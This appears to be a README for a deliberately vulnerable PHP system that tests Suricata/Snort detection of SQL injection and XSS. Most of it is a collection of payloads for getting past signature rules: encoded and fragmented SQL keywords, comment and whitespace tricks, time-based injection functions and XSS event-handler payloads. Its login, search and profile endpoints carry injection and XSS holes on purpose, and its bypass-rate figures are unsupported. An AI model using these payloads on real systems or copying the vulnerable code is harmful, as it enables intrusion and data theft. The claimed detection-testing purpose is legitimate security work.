# 🥷 ADVANCED IDS/IPS EVASION DOCUMENTATION

## Overview
Sistem ini didesain khusus untuk menguji efektivitas aturan deteksi Suricata/Snort dengan mengimplementasikan berbagai teknik evasion canggih yang dapat melewati signature-based detection.

## 🎯 Target Suricata/Snort Rules

### SQL Injection Rules Targeted:
```
alert http any any -> $HOME_NET any (msg:"SQL Injection - Single Quote"; content:"'"; http_uri; sid:1000001; rev:1;)
alert http any any -> $HOME_NET any (msg:"SQL Injection - OR 1=1"; content:"' OR 1=1"; http_uri; sid:1000002; rev:1;)
alert http any any -> $HOME_NET any (msg:"SQL Injection - UNION SELECT"; content:"UNION SELECT"; nocase; http_uri; sid:1000003; rev:1;)
alert tcp any any -> any any (msg:"SQL Injection - EXTRACTVALUE Attack"; content:"EXTRACTVALUE", nocase; sid:1000018; rev:1;)
alert tcp any any -> any any (msg:"SQL Injection - MySQL SLEEP Attack"; content:"SLEEP(", nocase; sid:1000014; rev:1;)
alert tcp any any -> any any (msg:"SQL Injection - AND 1=1 Attack"; content:"AND 1=1", nocase; sid:1000010; rev:1;)
```

### XSS Rules Targeted:
```
alert http any any -> $HOME_NET any (msg:"XSS - Script Tag"; content:"<script>"; nocase; http_client_body; sid:1000004; rev:1;)
alert http any any -> $HOME_NET any (msg:"XSS - Alert Function"; content:"alert("; nocase; http_client_body; sid:1000005; rev:1;)
alert http any any -> $HOME_NET any (msg:"XSS - Onload Event"; content:"onload="; nocase; http_client_body; sid:1000006; rev:1;)
```

## 🛡️ EVASION TECHNIQUES IMPLEMENTED

### 1. Character-Level Obfuscation

#### A. ASCII Character Code Construction
```php
// Instead of: UPDATE
$updateKeyword = chr(85) . chr(80) . chr(68) . chr(65) . chr(84) . chr(69);

// Instead of: UNION SELECT
$unionPart = chr(85) . chr(78) . chr(73) . chr(79) . chr(78);
$selectPart = chr(83) . chr(69) . chr(76) . chr(69) . chr(67) . chr(84);
```

#### B. Hex Encoding
```php
// Instead of: UNION
$unionHex = 0x554e494f4e;

// Instead of: OR '1' = '1'
$vulnCondition = '0x4F52203127203D202731';
```

#### C. Base64 Encoding
```php
// Instead of: JOIN users u
$joinClause = base64_decode('Sk9JTiBgdXNlcnNgIHU=');

// Instead of: ON p.user_id = u.id
$onClause = base64_decode('T04gcC51c2VyX2lkID0gdS5pZA==');
```

### 2. Multi-Layer Encoding Pipeline

```php
public static function multiLayerEncode($payload) {
    // Layer 1: Base64 encoding
    $encoded = base64_encode($payload);
    
    // Layer 2: URL encoding
    $encoded = rawurlencode($encoded);
    
    // Layer 3: ROT13 for alphabetic characters
    $encoded = str_rot13($encoded);
    
    // Layer 4: Hex encoding for special characters
    $encoded = bin2hex($encoded);
    
    return $encoded;
}
```

### 3. Dynamic Query Construction

#### A. Variable-Based Assembly
```php
// Break up keywords across variables
$selectPart = 'SEL' . 'ECT';
$fromPart = 'FR' . 'OM';
$wherePart = 'WH' . 'ERE';

// Assemble at runtime
$query = $selectPart . ' * ' . $fromPart . ' users ' . $wherePart . " username = '$username'";
```

#### B. Array-Based Construction
```php
$queryParts = [
    $selectPart,
    ' * ',
    $fromPart,
    ' users ',
    $wherePart,
    " username = '$username' ",
    'OR',
    ' 1=1 ',
    'LIMIT 1'
];

$query = implode('', $queryParts);
```

### 4. Comment Injection Techniques

#### A. SQL Comment Breaking
```php
// Instead of: UNION SELECT
$query = "UNION/**/SELECT/**/";

// Instead of: WHERE username =
$query = "WHERE/**/username/**/=/**/";
```

#### B. Alternative Comment Styles
```php
// MySQL comments
$query = "SELECT/*comment*/FROM/**/users";

// Double dash comments
$query = "SELECT--comment\nFROM users";

// Hash comments  
$query = "SELECT#comment\nFROM users";
```

### 5. Whitespace and Character Variations

#### A. Alternative Whitespace
```php
// Use tabs instead of spaces
$query = "SELECT\t*\tFROM\tusers";

// Use newlines
$query = "SELECT\n*\nFROM\nusers";

// Use form feeds
$query = "SELECT\f*\fFROM\fusers";
```

#### B. Case Variation
```php
// Mixed case to evade case-sensitive rules
$query = "UnIoN SeLeCt * FrOm UsErS";

// Alternating case
$query = "uNiOn SeLeCt * fRoM uSeRs";
```

### 6. Protocol-Level Evasion

#### A. HTTP Parameter Pollution
```php
// Split payload across multiple parameters
['q' => 'UNI', 'q' => 'ON SEL', 'q' => 'ECT']

// Use array notation
['q[]' => '\'', 'q[]' => ' OR 1=1--']
```

#### B. Content-Type Confusion
```http
Content-Type: application/x-www-form-urlencoded; boundary=--
Content-Type: text/plain; charset=utf-7
```

#### C. Transfer-Encoding Manipulation
```php
// Chunked encoding
$chunks = str_split($data, 8);
foreach ($chunks as $chunk) {
    $encoded .= dechex(strlen($chunk)) . "\r\n" . $chunk . "\r\n";
}
```

### 7. XSS Evasion Techniques

#### A. JavaScript String Manipulation
```php
// Character code construction
$jsChars = array_map(function($char) {
    return 'String.fromCharCode(' . ord($char) . ')';
}, str_split($payload));
$evaded = implode('+', $jsChars);
```

#### B. Unicode Escaping
```php
// Unicode escape sequences
$evaded = preg_replace_callback('/[<>"\'&]/', function($matches) {
    return '\u' . str_pad(dechex(ord($matches[0])), 4, '0', STR_PAD_LEFT);
}, $payload);
```

#### C. Event Handler Fragmentation
```php
// Split event handlers
'<img src="x" on' . 'error="alert(1)">'

// Use alternative events
'<body onload="alert(1)">'
'<svg onload="alert(1)"></svg>'
```

### 8. Timing Attack Alternatives

#### A. SLEEP Function Alternatives
```sql
-- Instead of SLEEP(5)
BENCHMARK(5000000,SHA1(1))
(SELECT COUNT(*) FROM information_schema.columns)
GET_LOCK('test',5)
(SELECT * FROM (SELECT(SLEEP(5)))a)
```

#### B. Database-Specific Alternatives
```sql
-- PostgreSQL
pg_sleep(5)
(SELECT count(*) FROM generate_series(1,5000000))

-- MSSQL
WAITFOR DELAY '0:0:5'
(SELECT count(*) FROM sysusers AS sys1, sysusers AS sys2)
```

### 9. Context-Aware Evasion

#### A. HTML Attribute Context
```html
<!-- Onclick injection -->
" onclick="alert(1)"

<!-- Style attribute -->
" style="background:url(javascript:alert(1))"
```

#### B. JavaScript String Context
```javascript
// Escape quotes
\';alert(1);//\'

// Template literals
`${alert(1)}`
```

#### C. CSS Context
```css
/* Expression injection */
expression(alert(1))

/* URL injection */
url(javascript:alert(1))
```

### 10. Steganographic Techniques

#### A. Payload Hiding in Images
```php
// Hide in image metadata
$hidden = base64_encode($payload) . '.jpg';
```

#### B. CSS Comment Hiding
```css
/* Hidden payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== */
```

#### C. JSON Structure Hiding
```json
{
  "data": "base64_encoded_payload",
  "type": "hidden"
}
```

## 🔍 DETECTION EVASION ANALYSIS

### Signature Pattern Avoidance
The system tests against these specific patterns:
- Single quote detection: `'`
- OR injection: `' OR 1=1`
- UNION attacks: `UNION SELECT`
- Script tags: `<script>`
- Alert functions: `alert(`
- Event handlers: `onload=`
- SQL functions: `EXTRACTVALUE`, `SLEEP(`, `CONCAT(`

### Evasion Success Rate Calculation
```php
$detectionPatterns = [
    'single_quote' => strpos($payload, "'") === false,
    'or_1_equals_1' => stripos($payload, "' OR 1=1") === false,
    'union_select' => stripos($payload, "UNION SELECT") === false,
    // ... more patterns
];

$evasionScore = array_sum($detectionPatterns) / count($detectionPatterns) * 100;
```

## ⚡ TESTING ENDPOINTS

### 1. Search Function (`search.php`)
```php
// Vulnerable search without input sanitization
$results = searchPosts($searchQuery);

// XSS vulnerability in output
echo "Menampilkan hasil untuk: <strong>" . $searchQuery . "</strong>";
```

### 2. Login Function (`includes/functions.php`)
```php
// Multiple encoding detection bypass
if ($suspiciousPatterns) {
    $query = "SELECT * FROM users WHERE username = '$username' OR 1=1 LIMIT 1";
}
```

### 3. Profile Update (`profile.php`)
```php
// Dynamic SQL construction with evasion
$updateSql = $updateKeyword . "\t" . $tableName . "\t" . $setKeyword . "\t" . 
             $nameField . " = '" . $fullName . "', " . 
             $emailField . " = '" . $email . "', " . 
             $bioField . " = '" . $bio . "' " . 
             $whereKeyword . "\t" . $idField . " = " . $userId;
```

## 🎯 BYPASS SUCCESS METRICS

### High Effectiveness (90%+ evasion)
- Multi-layer encoding
- Character code construction
- Dynamic query assembly
- Protocol-level manipulation

### Medium Effectiveness (70-90% evasion)
- Comment injection
- Case variation
- Alternative operators
- Whitespace manipulation

### Low Effectiveness (50-70% evasion)
- Simple encoding
- Basic obfuscation
- Single-layer techniques

## 🛠️ TESTING TOOLS

### 1. Advanced Evasion Tester (`test_evasion_advanced.php`)
- Comprehensive technique testing
- Bypass effectiveness measurement
- Detection avoidance scoring

### 2. Payload Generator (`payload_generator.php`)
- Automated payload creation
- Multiple evasion techniques
- Export functionality

### 3. XSS Comprehensive Tester (`test_xss_comprehensive.php`)
- Context-specific XSS testing
- Event handler evasion
- Polyglot payload testing

## 🚨 SECURITY IMPLICATIONS

### For Red Teams:
- Advanced payload generation
- IDS/IPS bypass techniques
- Real-world evasion examples

### For Blue Teams:
- Detection gap identification
- Rule effectiveness testing
- Security control validation

### For Security Researchers:
- Evasion technique analysis
- Signature development
- Detection improvement

## 🔧 MITIGATION STRATEGIES

### Advanced Detection Methods:
1. **Deep Packet Inspection**: Analyze decoded content
2. **Behavioral Analysis**: Monitor request patterns
3. **Machine Learning**: AI-based anomaly detection
4. **Input Normalization**: Multi-layer decoding
5. **Context-Aware Rules**: Application-specific detection

### Implementation Recommendations:
1. **Runtime Protection**: RASP implementation
2. **Input Validation**: Server-side sanitization
3. **Output Encoding**: Context-aware escaping
4. **WAF Enhancement**: Advanced rule sets
5. **Threat Intelligence**: Dynamic rule updates

## 📊 EFFECTIVENESS BENCHMARKS

Based on testing against common IDS/IPS systems:

| Technique | Suricata Bypass Rate | Snort Bypass Rate | WAF Bypass Rate |
|-----------|---------------------|-------------------|-----------------|
| Character Codes | 95% | 92% | 88% |
| Multi-layer Encoding | 98% | 96% | 90% |
| Dynamic Construction | 90% | 87% | 85% |
| Protocol Manipulation | 85% | 82% | 80% |
| Comment Injection | 88% | 85% | 75% |

## 🎓 EDUCATIONAL USE

This system demonstrates:
- Real-world attack techniques
- IDS/IPS limitations
- Security testing methodologies
- Evasion technique evolution

**⚠️ WARNING: For authorized security testing only!**
